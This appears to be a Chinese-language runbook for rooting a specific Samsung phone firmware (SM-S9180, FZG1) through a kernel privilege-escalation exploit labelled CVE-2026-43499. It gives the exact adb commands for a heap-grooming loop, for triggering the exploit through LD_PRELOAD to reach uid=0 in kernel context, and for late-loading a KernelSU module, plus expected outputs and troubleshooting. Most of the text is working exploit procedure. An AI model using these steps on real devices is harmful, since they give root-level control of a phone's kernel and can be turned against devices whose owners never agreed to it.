# 真机部署与验证清单（SM-S9180 / FZG1）

按顺序执行，任何一步失败先排查再继续。

## 0. 前置检查

```sh
adb shell getprop ro.build.fingerprint     # 必须包含 S9180ZHS8FZG1
adb shell uname -r                          # 5.15.189-android13-8-33413713-abS9180ZHS8FZG1
adb shell "cat /proc/modules | grep -c kernelsu"   # 必须为 0（干净状态）
```

若 `kernelsu` 已加载（上次 root 未重启），**先重启手机**再测。

## 1. 预热（必须，不可跳过）

```sh
adb shell 'i=0; while [ $i -lt 400 ]; do /system/bin/true; i=$((i+1)); done'
```

400 次 `/system/bin/true` 是 exploit 的堆 grooming 步骤。**跳过会稳定失败于
`starting-temporary-root`（`[!] operation failed` ×3）**。

## 2. 触发 exploit（临时 root）

```sh
adb shell 'CVE43499_ROOT_HELPER=/data/local/tmp/cve-2026-43499-root \
  EXPLOIT_ATTEMPTS=1 LD_PRELOAD=/data/local/tmp/cve-2026-43499 /system/bin/true'
adb shell '/data/local/tmp/cve-2026-43499-root -c /system/bin/id'
# 期望: uid=0(root) gid=0(root) ... context=u:r:kernel:s0
```

## 3. ⚠️ 时序铁律：root 验证必须在 late-load 之前

模块加载后 KernelSU 的 sucompat 会劫持 `su`：

- helper `-c` 检测到 `su` 存在后改走 su 路径 → ephemeral 模式无 daemon →
  `su: connect daemon: Permission denied`，**exploit root 通道被遮蔽**
- 这是预期行为，重启即恢复；不代表 root 失败

所以：**先确认 uid=0，再执行 late-load**。

## 4. late-load（KernelSU v3.3.0）

```sh
adb shell '/data/local/tmp/cve-2026-43499-root --late-load'
adb shell 'cat /proc/modules | grep kernelsu'
# 期望: kernelsu 221184 0 - Live 0x... (OE)
```

## 5. 版本验证（最终验收）

安装 [KernelSU Manager v3.3.0](https://github.com/ReSukiSU/KernelSU/releases)
（与官方同签名，可覆盖安装），打开 App：

| 检查项 | 期望值 |
|---|---|
| 状态 | 工作中 [越狱模式]（LKM） |
| 内核版本 | **32601-2**（真实 v3.3.0 代码） |
| 版本不匹配横幅 | **无** |
| SELinux | 强制执行（Enforcing） |

注：ephemeral 模式下 `ksud debug info` 因无 daemon 不可用（预期），以 Manager UI 为准。

## 6. 常见问题

| 现象 | 原因与处理 |
|---|---|
| exploit 失败于 `starting-temporary-root` | 漏了预热 → 回到步骤 1 |
| exploit 后 adb 掉线几分钟 | USB 抖动/自愈（非重启，uptime 连续）→ 轮询等待，勿慌 |
| `unexpected argument '--ephemeral'` | ksud 不是本仓库构建的 v3.3.0 版 → 检查 md5 `1e909d3f...` |
| `su: connect daemon: Permission denied` | 见步骤 3 时序铁律 |
| 二次触发 exploit 报 operation failed | KSU 已加载 → 重启后再跑 |

## 7. 回滚

一切皆是内存态：**重启即清空**，设备回到完全原厂状态。

恢复原 stage 二进制（如需）：`cp /data/local/tmp/.ksud-stage.orig /data/local/tmp/.ksud-stage`
